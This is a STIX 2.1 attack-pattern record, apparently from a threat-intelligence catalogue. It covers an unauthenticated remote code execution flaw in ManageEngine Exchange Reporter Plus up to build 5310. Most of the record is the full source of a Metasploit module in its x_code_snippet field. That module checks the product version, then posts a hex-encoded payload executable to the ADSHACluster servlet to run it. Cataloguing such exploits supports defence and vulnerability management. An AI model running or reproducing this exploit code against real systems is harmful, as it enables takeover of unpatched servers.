{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d67229a2-8f1e-4925-abfa-b5fc112bf295",
    "created": "2024-08-14T16:53:04.672883Z",
    "modified": "2024-08-14T16:53:04.672888Z",
    "name": "ManageEngine Exchange Reporter Plus Unauthenticated RCE",
    "description": " This module exploits a remote code execution vulnerability that exists in Exchange Reporter Plus <= 5310, caused by execution of bcp.exe file inside ADSHACluster servlet  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/manageengine_adshacluster_rce.rb",
            "external_id": "manageengine_adshacluster_rce.rb"
        },
        {
            "source_name": "reference",
            "url": "https://security.szurek.pl/en/manage-engine-exchange-reporter-plus-unauthenticated-rce/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule  < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::EXE\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'ManageEngine Exchange Reporter Plus Unauthenticated RCE',\n      'Description'    => %q{\n        This module exploits a remote code execution vulnerability that\n        exists in Exchange Reporter Plus <= 5310, caused by execution of\n        bcp.exe file inside ADSHACluster servlet\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Kacper Szurek <kacperszurek@gmail.com>'\n        ],\n      'References'     =>\n        [\n          ['URL', 'https://security.szurek.pl/en/manage-engine-exchange-reporter-plus-unauthenticated-rce/']\n        ],\n      'Platform'       => ['win'],\n      'Arch'           => [ARCH_X86, ARCH_X64],\n      'Targets'        => [['Automatic', {}]],\n      'DisclosureDate' => '2018-06-28',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [ true, 'The URI of the application', '/']),\n        Opt::RPORT(8181),\n      ])\n\n  end\n\n  def bin_to_hex(s)\n      s.each_byte.map { |b| b.to_s(16).rjust(2,'0') }.join\n  end\n\n  def check\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri'    => normalize_uri(target_uri.path, 'exchange', 'servlet', 'GetProductVersion')\n    })\n\n    unless res\n      vprint_error 'Connection failed'\n      return CheckCode::Safe\n    end\n\n    unless res.code == 200\n      vprint_status 'Target is not ManageEngine Exchange Reporter Plus'\n      return CheckCode::Safe\n    end\n\n    begin\n      json = res.get_json_document\n      raise if json.empty? || !json['BUILD_NUMBER']\n    rescue\n      vprint_status 'Target is not ManageEngine Exchange Reporter Plus'\n      return CheckCode::Safe\n    end\n\n    vprint_status \"Version: #{json['BUILD_NUMBER']}\"\n\n    if json['BUILD_NUMBER'].to_i <= 5310\n      return CheckCode::Appears\n    end\n\n    CheckCode::Safe\n  end\n\n  def exploit\n    res = send_request_cgi({\n      'method'    => 'POST',\n      'uri'       => normalize_uri(target_uri.path, 'exchange', 'servlet', 'ADSHACluster'),\n      'vars_post' => {\n        'MTCALL'  => \"nativeClient\",\n        'BCP_RLL' => \"0102\",\n        'BCP_EXE' => bin_to_hex(generate_payload_exe)\n      }\n    })\n  end\nend\n",
    "x_mitre_disclosure_date": "2018-06-28",
    "x_mitre_platforms": [
        "['win']"
    ]
}